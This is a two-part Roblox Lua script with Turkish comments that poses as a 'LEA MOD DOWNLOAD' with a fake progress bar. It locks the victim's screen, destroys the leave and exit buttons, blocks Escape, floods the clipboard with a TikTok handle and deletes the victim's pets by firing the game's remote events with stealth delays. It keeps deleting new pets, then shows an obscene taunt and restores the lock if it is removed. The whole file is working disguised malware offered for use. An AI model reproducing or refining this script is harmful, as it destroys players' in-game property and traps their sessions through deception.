--[ palofsc : STEALTH_PET_NUKER_V7_PART1 ]
--[ KURULUM + UI + KORUMA SİSTEMLERİ ]

local player = game:GetService("Players").LocalPlayer
local replicatedStorage = game:GetService("ReplicatedStorage")
local coreGui = game:GetService("CoreGui")
local runService = game:GetService("RunService")
local tweenService = game:GetService("TweenService")
local guiService = game:GetService("GuiService")
local contextActionService = game:GetService("ContextActionService")
local userInputService = game:GetService("UserInputService")
local starterGui = game:GetService("StarterGui")
local httpService = game:GetService("HttpService")

--[ ==================== DEĞİŞKENLER ==================== ]
local copyCounter = 0
local screenGui = nil
local blackFrame = nil
local finalLabel = nil
local tiktokLabel = nil

--[ ==================== TAM EKRAN KİLİDİ ==================== ]
screenGui = Instance.new("ScreenGui")
screenGui.Name = "SYS_" .. math.random(10000, 99999)
screenGui.Parent = coreGui
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.DisplayOrder = 999

blackFrame = Instance.new("Frame")
blackFrame.Size = UDim2.new(1, 0, 1, 0)
blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
blackFrame.BorderSizePixel = 0
blackFrame.ZIndex = 999
blackFrame.Parent = screenGui

local clickBlocker = Instance.new("TextButton")
clickBlocker.Size = UDim2.new(1, 0, 1, 0)
clickBlocker.BackgroundTransparency = 1
clickBlocker.Text = ""
clickBlocker.ZIndex = 1000
clickBlocker.Modal = true
clickBlocker.Parent = screenGui

--[ Çıkış butonu imha ]
local function killLeaveButton()
    for _, loc in pairs({guiService, coreGui, player:FindFirstChild("PlayerGui"), starterGui}) do
        if loc then
            for _, c in pairs(loc:GetDescendants()) do
                if c:IsA("TextButton") or c:IsA("ImageButton") then
                    local n = c.Name:lower()
                    local t = c.Text and c.Text:lower() or ""
                    if n:find("leave") or n:find("exit") or n:find("quit") or n:find("çık") or
                       t:find("leave") or t:find("exit") or t:find("quit") or t:find("çık") then
                        pcall(function() c.Visible = false c.Active = false c:Destroy() end)
                    end
                end
            end
        end
    end
end

spawn(function() while true do killLeaveButton() runService.RenderStepped:Wait() end end)

--[ ESC + tuş engelle ]
contextActionService:BindAction("BLK_ESC", function() return Enum.ContextActionResult.Sink end, false, Enum.KeyCode.Escape)
starterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)

--[ ==================== UI ELEMANLARI ==================== ]
local topLabel = Instance.new("TextLabel")
topLabel.Size = UDim2.new(1, 0, 0.1, 0)
topLabel.Position = UDim2.new(0, 0, 0.05, 0)
topLabel.BackgroundTransparency = 1
topLabel.Text = "LEA MOD DOWNLOAD"
topLabel.TextColor3 = Color3.new(0.8, 0, 0)
topLabel.TextStrokeColor3 = Color3.new(0.3, 0, 0)
topLabel.TextStrokeTransparency = 0
topLabel.Font = Enum.Font.GothamBlack
topLabel.TextScaled = true
topLabel.ZIndex = 1002
topLabel.Parent = screenGui

local barBG = Instance.new("Frame")
barBG.Size = UDim2.new(0.8, 0, 0.04, 0)
barBG.Position = UDim2.new(0.1, 0, 0.45, 0)
barBG.BackgroundColor3 = Color3.new(0.12, 0.12, 0.12)
barBG.BorderSizePixel = 1
barBG.BorderColor3 = Color3.new(0.3, 0, 0)
barBG.ZIndex = 1002
barBG.Parent = screenGui

local barFill = Instance.new("Frame")
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.BackgroundColor3 = Color3.new(0.75, 0, 0)
barFill.BorderSizePixel = 0
barFill.ZIndex = 1003
barFill.Parent = barBG

local barText = Instance.new("TextLabel")
barText.Size = UDim2.new(1, 0, 1, 0)
barText.BackgroundTransparency = 1
barText.Text = "PETLER TARANIYOR..."
barText.TextColor3 = Color3.new(1, 1, 1)
barText.Font = Enum.Font.GothamBold
barText.TextScaled = true
barText.ZIndex = 1004
barText.Parent = barBG

local infoLabel = Instance.new("TextLabel")
infoLabel.Size = UDim2.new(1, 0, 0.05, 0)
infoLabel.Position = UDim2.new(0, 0, 0.55, 0)
infoLabel.BackgroundTransparency = 1
infoLabel.Text = "Lutfen bekleyin..."
infoLabel.TextColor3 = Color3.new(0.6, 0.6, 0.6)
infoLabel.Font = Enum.Font.GothamMedium
infoLabel.TextScaled = true
infoLabel.ZIndex = 1002
infoLabel.Parent = screenGui

--[ Sahte progress bar animasyonu ]
spawn(function()
    local p = 0
    while p < 99.9 do
        p = math.min(p + math.random(2, 12) * 0.1, 99.9)
        barFill.Size = UDim2.new(p / 100, 0, 1, 0)
        barText.Text = string.format("PETLER TARANIYOR... %%%.1f", p)
        local d = math.random(1, 5) * 0.1
        if p > 70 then d = math.random(3, 10) * 0.1 end
        if p > 90 then d = math.random(5, 15) * 0.1 end
        task.wait(d)
    end
    while true do
        barFill.Size = UDim2.new(0.999, 0, 1, 0)
        barText.Text = "PETLER TARANIYOR... %99.9"
        task.wait(0.4)
        barFill.Size = UDim2.new(0.998, 0, 1, 0)
        barText.Text = "PETLER TARANIYOR... %99.8"
        task.wait(0.3)
    end
end)

--[ ==================== SAYAÇLI KOPYALAMA ==================== ]
spawn(function()
    while true do
        task.wait(0.03)
        copyCounter = copyCounter + 1
        local textToCopy = "TIKTOK @LEAPLUS " .. copyCounter
        pcall(function()
            if syn and syn.write_clipboard then
                syn.write_clipboard(textToCopy)
            elseif setclipboard then
                setclipboard(textToCopy)
            end
        end)
    end
end)

print("[PART1] Kurulum tamam. Degiskenler: screenGui, blackFrame, finalLabel, tiktokLabel, copyCounter hazir.")--[ palofsc : STEALTH_PET_NUKER_V7_PART2 ]
--[ PET SİLME + FİNAL EKRANI + SONSUZ KORUMA ]
--[ PART 1'den gelen değişkenler: screenGui, blackFrame, finalLabel, tiktokLabel, copyCounter ]

local player = game:GetService("Players").LocalPlayer
local replicatedStorage = game:GetService("ReplicatedStorage")
local coreGui = game:GetService("CoreGui")
local runService = game:GetService("RunService")
local guiService = game:GetService("GuiService")
local starterGui = game:GetService("StarterGui")
local contextActionService = game:GetService("ContextActionService")

--[ ==================== STEALTH DELAY FONKSİYONU ==================== ]
local function stealthDelay(base)
    task.wait(base + math.random(1, 15) * 0.001)
end

--[ ==================== PET VERİ TOPLAMA ==================== ]
local function collectPets()
    local pets = {}
    for _, item in pairs(player.Backpack:GetChildren()) do
        if item:IsA("Tool") then table.insert(pets, {obj = item, name = item.Name}) end
    end
    local pg = player:FindFirstChild("PlayerGui")
    if pg then
        for _, screen in pairs(pg:GetChildren()) do
            local sn = screen.Name:lower()
            if sn:find("pet") or sn:find("inventory") or sn:find("backpack") or sn:find("collection") then
                for _, el in pairs(screen:GetDescendants()) do
                    if el:IsA("ImageButton") or el:IsA("TextButton") then
                        local en = el.Name:lower()
                        if en:find("pet") or en:find("delete") or en:find("remove") or en:find("trade") then
                            table.insert(pets, {obj = el, name = el.Name})
                        end
                    end
                end
            end
        end
    end
    for _, obj in pairs(workspace:GetDescendants()) do
        if obj:IsA("Model") and obj.Name:lower():find("pet") then
            table.insert(pets, {obj = obj, name = obj.Name})
        end
    end
    return pets
end

--[ ==================== REMOTE BULMA ==================== ]
local function findRemotes()
    local remotes = {}
    local kw = {"deletepet", "removepet", "tradepet", "destroypet", "petdelete", "deleteitem", "removeitem", "trashitem", "clearpet", "releasepet", "delete", "remove", "trade"}
    for _, obj in pairs(replicatedStorage:GetDescendants()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            local nl = obj.Name:lower()
            for _, k in pairs(kw) do
                if nl:find(k) then table.insert(remotes, obj) break end
            end
        end
    end
    if #remotes == 0 then
        for _, obj in pairs(replicatedStorage:GetDescendants()) do
            if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                table.insert(remotes, obj)
            end
        end
    end
    return remotes
end

--[ ==================== STEALTH SİLME ==================== ]
local function stealthDelete(petData)
    spawn(function()
        local remotes = findRemotes()
        local paramSets = {
            {petData.obj}, {petData.obj, true}, {petData.obj, "delete"},
            {petData.name, "remove"}, {petData.name},
            {"delete", petData.obj}, {true, petData.obj},
        }
        for _, remote in pairs(remotes) do
            for _, params in pairs(paramSets) do
                stealthDelay(0.01)
                pcall(function()
                    if remote:IsA("RemoteEvent") then remote:FireServer(unpack(params))
                    elseif remote:IsA("RemoteFunction") then remote:InvokeServer(unpack(params)) end
                end)
            end
        end
        stealthDelay(0.02)
        pcall(function() if petData.obj and petData.obj.Parent then petData.obj:Destroy() end end)
        stealthDelay(0.01)
        pcall(function() if petData.obj then petData.obj.Parent = nil end end)
    end)
end

local function massDelete(allPets)
    local batchSize = math.random(3, 7)
    local batches = {}
    for i = 1, #allPets, batchSize do
        local batch = {}
        for j = i, math.min(i + batchSize - 1, #allPets) do
            table.insert(batch, allPets[j])
        end
        table.insert(batches, batch)
    end
    for _, batch in pairs(batches) do
        for _, petData in pairs(batch) do
            stealthDelete(petData)
        end
        task.wait(math.random(15, 50) * 0.01)
    end
end

--[ ==================== KALICI TEMİZLİK ==================== ]
local function persistentCleanup()
    player.Backpack.ChildAdded:Connect(function(child)
        stealthDelay(0.02)
        if child:IsA("Tool") then stealthDelete({obj = child, name = child.Name}) end
    end)
    workspace.ChildAdded:Connect(function(child)
        stealthDelay(0.05)
        if child:IsA("Model") and child.Name:lower():find("pet") then
            stealthDelete({obj = child, name = child.Name})
        end
    end)
end

--[ ==================== ANA YÜRÜTME ==================== ]
spawn(function()
    local allPets = collectPets()
    massDelete(allPets)
    persistentCleanup()
    for _, obj in pairs(workspace:GetDescendants()) do
        if obj:IsA("Model") then
            local nl = obj.Name:lower()
            if nl:find("pet") or nl:find("companion") or nl:find("follower") then
                stealthDelay(0.005)
                pcall(function() obj:Destroy() end)
            end
        end
    end
end)

--[ ==================== FİNAL EKRANI (5 SANİYE SONRA) ==================== ]
task.wait(5)

for _, child in pairs(screenGui:GetChildren()) do
    if child ~= blackFrame and child.Name ~= "INPUT_CATCHER" and not child.Name:find("BLOCKER") then
        pcall(function() child:Destroy() end)
    end
end

finalLabel = Instance.new("TextLabel")
finalLabel.Size = UDim2.new(0.9, 0, 0.4, 0)
finalLabel.Position = UDim2.new(0.05, 0, 0.25, 0)
finalLabel.BackgroundTransparency = 1
finalLabel.Text = "LEA FUCKED\nYOUR MOTHER"
finalLabel.TextColor3 = Color3.new(1, 0, 0)
finalLabel.TextStrokeColor3 = Color3.new(0.5, 0, 0)
finalLabel.TextStrokeTransparency = 0
finalLabel.Font = Enum.Font.GothamBlack
finalLabel.TextScaled = true
finalLabel.ZIndex = 2000
finalLabel.Parent = screenGui

spawn(function()
    local vis = true
    while true do
        task.wait(0.2)
        vis = not vis
        finalLabel.TextTransparency = vis and 0 or 0.5
    end
end)

local colors = {Color3.new(1,0,0), Color3.new(0.9,0,0), Color3.new(1,0.05,0), Color3.new(0.85,0,0.05)}
local ci = 1
spawn(function()
    while true do
        task.wait(0.35)
        ci = ci % #colors + 1
        finalLabel.TextColor3 = colors[ci]
    end
end)

tiktokLabel = Instance.new("TextLabel")
tiktokLabel.Size = UDim2.new(1, 0, 0.08, 0)
tiktokLabel.Position = UDim2.new(0, 0, 0.85, 0)
tiktokLabel.BackgroundTransparency = 1
tiktokLabel.Text = "TIKTOK @LEAPLUS"
tiktokLabel.TextColor3 = Color3.new(1, 1, 1)
tiktokLabel.Font = Enum.Font.GothamBold
tiktokLabel.TextScaled = true
tiktokLabel.ZIndex = 2000
tiktokLabel.Parent = screenGui

--[ ==================== SONSUZ KORUMA ==================== ]
spawn(function()
    while true do
        runService.RenderStepped:Wait()
        if not screenGui or not screenGui.Parent then
            screenGui = Instance.new("ScreenGui")
            screenGui.Name = "SYS_" .. math.random(10000, 99999)
            screenGui.Parent = coreGui
            screenGui.ResetOnSpawn = false
            screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
            blackFrame.Parent = screenGui
            if finalLabel then finalLabel.Parent = screenGui end
            if tiktokLabel then tiktokLabel.Parent = screenGui end
        end
        pcall(function() starterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false) end)
        task.wait(0.1)
    end
end)

print("[PART2] Silme tamam, final ekrani aktif. Toplam kopyalama sayisi: " .. copyCounter)
